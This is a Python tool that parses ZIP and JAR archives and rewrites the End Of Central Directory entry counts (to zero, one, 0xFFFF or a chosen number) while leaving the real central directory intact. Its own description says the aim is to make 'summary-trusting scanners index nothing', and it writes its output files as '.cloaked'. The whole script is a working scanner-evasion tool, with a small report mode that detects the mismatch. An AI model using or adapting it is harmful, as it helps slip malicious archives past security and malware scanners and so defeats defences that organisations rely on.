#!/usr/bin/env python3

from __future__ import annotations

import argparse
import hashlib
import os
import shutil
import struct
import sys

EOCD_SIG = b"PK\x05\x06"
CD_SIG = b"PK\x01\x02"
Z64_EOCD_SIG = b"PK\x06\x06"
Z64_LOC_SIG = b"PK\x06\x07"

EOCD_LEN = 22
Z64_LOC_LEN = 20
CD_HEADER_LEN = 46
MAX_COMMENT = 0xFFFF


class ArchiveError(Exception):
    pass


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def find_eocd(data: bytes) -> int:
    end = len(data)
    start = max(0, end - (MAX_COMMENT + EOCD_LEN))
    pos = data.rfind(EOCD_SIG, start, end)
    fallback = -1
    while pos != -1:
        if pos + EOCD_LEN <= end:
            (comment_len,) = struct.unpack_from("<H", data, pos + 20)
            if pos + EOCD_LEN + comment_len == end:
                return pos
            if fallback == -1:
                fallback = pos
        pos = data.rfind(EOCD_SIG, start, pos)
    if fallback != -1:
        return fallback
    raise ArchiveError("no End Of Central Directory record found")


def read_eocd(data: bytes, pos: int) -> dict:
    disk, cd_disk, n_disk, n_total, cd_size, cd_off, clen = struct.unpack_from(
        "<HHHHIIH", data, pos + 4
    )
    return {
        "pos": pos,
        "disk": disk,
        "cd_disk": cd_disk,
        "entries_disk": n_disk,
        "entries_total": n_total,
        "cd_size": cd_size,
        "cd_offset": cd_off,
        "comment_len": clen,
        "zip64": n_total == 0xFFFF or cd_off == 0xFFFFFFFF or cd_size == 0xFFFFFFFF,
    }


def read_zip64(data: bytes, eocd_pos: int) -> dict | None:
    loc = eocd_pos - Z64_LOC_LEN
    if loc < 0 or data[loc:loc + 4] != Z64_LOC_SIG:
        return None
    (z64_off,) = struct.unpack_from("<Q", data, loc + 8)
    if z64_off + 56 > len(data) or data[z64_off:z64_off + 4] != Z64_EOCD_SIG:
        return None
    n_disk, n_total = struct.unpack_from("<QQ", data, z64_off + 24)
    cd_size, cd_off = struct.unpack_from("<QQ", data, z64_off + 40)
    return {
        "pos": z64_off,
        "entries_disk": n_disk,
        "entries_total": n_total,
        "cd_size": cd_size,
        "cd_offset": cd_off,
    }


def cd_start(data: bytes, eocd: dict) -> tuple[int, int, int]:
    off, size = eocd["cd_offset"], eocd["cd_size"]
    if off + 4 <= len(data) and data[off:off + 4] == CD_SIG:
        return off, size, 0
    prefix = eocd["pos"] - size - off
    if prefix >= 0 and data[off + prefix:off + prefix + 4] == CD_SIG:
        return off + prefix, size, prefix
    probe = data.rfind(CD_SIG, 0, eocd["pos"])
    if probe != -1:
        return probe, eocd["pos"] - probe, probe - off
    raise ArchiveError("central directory signature not found")


def walk_cd(data: bytes, off: int, size: int) -> list[dict]:
    entries: list[dict] = []
    p, limit = off, off + size
    while p < limit:
        if p + CD_HEADER_LEN > limit:
            raise ArchiveError(f"truncated central directory record at 0x{p:x}")
        if data[p:p + 4] != CD_SIG:
            raise ArchiveError(f"bad central directory signature at 0x{p:x}")
        flags, method = struct.unpack_from("<HH", data, p + 8)
        crc, csize, usize = struct.unpack_from("<III", data, p + 16)
        name_len, extra_len, comment_len = struct.unpack_from("<HHH", data, p + 28)
        local_off = struct.unpack_from("<I", data, p + 42)[0]
        name = data[p + CD_HEADER_LEN:p + CD_HEADER_LEN + name_len].decode(
            "utf-8", "replace"
        )
        entries.append(
            {
                "name": name,
                "flags": flags,
                "method": method,
                "crc": crc,
                "csize": csize,
                "usize": usize,
                "local_offset": local_off,
            }
        )
        p += CD_HEADER_LEN + name_len + extra_len + comment_len
    if p != limit:
        raise ArchiveError(f"central directory overran by {p - limit} bytes")
    return entries


def inspect(data: bytes) -> dict:
    eocd = read_eocd(data, find_eocd(data))
    z64 = read_zip64(data, eocd["pos"])
    off, size, prefix = cd_start(data, eocd)
    entries = walk_cd(data, off, size)
    declared = z64["entries_total"] if z64 else eocd["entries_total"]
    return {
        "eocd": eocd,
        "zip64": z64,
        "cd_offset": off,
        "cd_size": size,
        "prefix": prefix,
        "entries": entries,
        "declared": declared,
        "actual": len(entries),
    }


def resolve_count(mode: str, actual: int) -> int:
    if mode == "zero":
        return 0
    if mode == "one":
        return 1
    if mode == "ffff":
        return 0xFFFF
    if mode.startswith("keep:"):
        want = int(mode.split(":", 1)[1])
        return max(0, min(want, actual, 0xFFFF))
    raise ArchiveError(f"unknown count mode {mode!r}")


def patch(data: bytes, mode: str) -> tuple[bytes, dict]:
    info = inspect(data)
    actual = info["actual"]
    new_count = resolve_count(mode, actual)

    buf = bytearray(data)
    eocd = info["eocd"]
    struct.pack_into("<HH", buf, eocd["pos"] + 8, new_count, new_count)

    regions = [(eocd["pos"] + 8, 4)]
    if info["zip64"]:
        z64 = info["zip64"]
        struct.pack_into("<QQ", buf, z64["pos"] + 24, new_count, new_count)
        regions.append((z64["pos"] + 24, 16))

    out = bytes(buf)
    changed = sum(
        1
        for off, length in regions
        for i in range(length)
        if data[off + i] != out[off + i]
    )

    check = inspect(out)
    if check["actual"] != actual:
        raise ArchiveError("entry count changed after patch — aborting")
    if check["declared"] != new_count:
        raise ArchiveError("patch did not take — aborting")

    return out, {
        "actual": actual,
        "old_declared": info["declared"],
        "new_declared": new_count,
        "zip64": bool(info["zip64"]),
        "prefix": info["prefix"],
        "entries": info["entries"],
        "cd_offset": info["cd_offset"],
        "bytes_changed": changed,
    }


def default_output(path: str) -> str:
    root, ext = os.path.splitext(path)
    return f"{root}.cloaked{ext or '.jar'}"


def write_atomic(path: str, data: bytes) -> None:
    tmp = f"{path}.tmp.{os.getpid()}"
    with open(tmp, "wb") as fh:
        fh.write(data)
        fh.flush()
        os.fsync(fh.fileno())
    os.replace(tmp, path)


def print_report(path: str, info: dict) -> None:
    eocd = info["eocd"]
    print(f"file            {path}")
    print(f"size            {os.path.getsize(path) if os.path.exists(path) else 0}")
    print(f"eocd offset     0x{eocd['pos']:x}")
    print(f"declared count  {info['declared']}")
    print(f"actual count    {info['actual']}")
    print(f"cd offset       0x{info['cd_offset']:x}  size {info['cd_size']}")
    print(f"zip64           {bool(info['zip64'])}")
    if info["prefix"]:
        print(f"prefix bytes    {info['prefix']}")
    status = "PATCHED" if info["declared"] != info["actual"] else "CLEAN"
    print(f"state           {status}")
    for e in info["entries"][:40]:
        print(f"  {e['name']}")


def collect_inputs(paths: list[str]) -> list[str]:
    found: list[str] = []
    for p in paths:
        if os.path.isdir(p):
            for name in sorted(os.listdir(p)):
                if name.lower().endswith((".jar", ".zip")):
                    found.append(os.path.join(p, name))
        else:
            found.append(p)
    return found


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Rewrite EOCD entry counts so summary-trusting scanners index nothing."
    )
    ap.add_argument("jar", nargs="+", help="input .jar / .zip file(s) or a directory")
    ap.add_argument("-o", "--output", help="output file, or directory for multiple inputs")
    ap.add_argument(
        "--mode",
        default="zero",
        help="count to write: zero | one | ffff | keep:N (default: zero)",
    )
    ap.add_argument("--in-place", action="store_true", help="overwrite input, keep .bak")
    ap.add_argument("--report", action="store_true", help="inspect only, write nothing")
    ap.add_argument("--verify", action="store_true", help="structural check only")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args(argv)

    inputs = collect_inputs(args.jar)
    if not inputs:
        print("error: no input archives", file=sys.stderr)
        return 2
    if args.output and len(inputs) > 1 and not os.path.isdir(args.output):
        print("error: -o must be a directory for multiple inputs", file=sys.stderr)
        return 2

    rc = 0
    for src in inputs:
        if not os.path.isfile(src):
            print(f"error: no such file: {src}", file=sys.stderr)
            rc = 2
            continue
        with open(src, "rb") as fh:
            data = fh.read()

        try:
            info = inspect(data)
        except ArchiveError as exc:
            print(f"error: {src}: {exc}", file=sys.stderr)
            rc = 3
            continue

        if args.report or args.verify:
            print_report(src, info)
            if info["declared"] != info["actual"]:
                print(
                    f"note: declared {info['declared']} vs actual {info['actual']} — "
                    "summary counts disagree with the central directory",
                    file=sys.stderr,
                )
            if len(inputs) > 1:
                print()
            continue

        try:
            patched, meta = patch(data, args.mode)
        except (ArchiveError, ValueError) as exc:
            print(f"error: {src}: {exc}", file=sys.stderr)
            rc = 3
            continue

        if args.in_place:
            out_path = src
            shutil.copy2(src, src + ".bak")
        elif args.output:
            out_path = (
                os.path.join(args.output, os.path.basename(default_output(src)))
                if os.path.isdir(args.output)
                else args.output
            )
        else:
            out_path = default_output(src)

        write_atomic(out_path, patched)

        if not args.quiet:
            print(f"in              {src}")
            print(f"out             {out_path}")
            print(f"entries         {meta['actual']}")
            print(f"declared        {meta['old_declared']} -> {meta['new_declared']}")
            print(f"zip64           {meta['zip64']}")
            print(f"sha256 in       {sha256(data)}")
            print(f"sha256 out      {sha256(patched)}")
            print(f"bytes changed   {meta['bytes_changed']}")
            print("structural      central directory intact, all records parse")
            if len(inputs) > 1:
                print()

    return rc


if __name__ == "__main__":
    sys.exit(main())
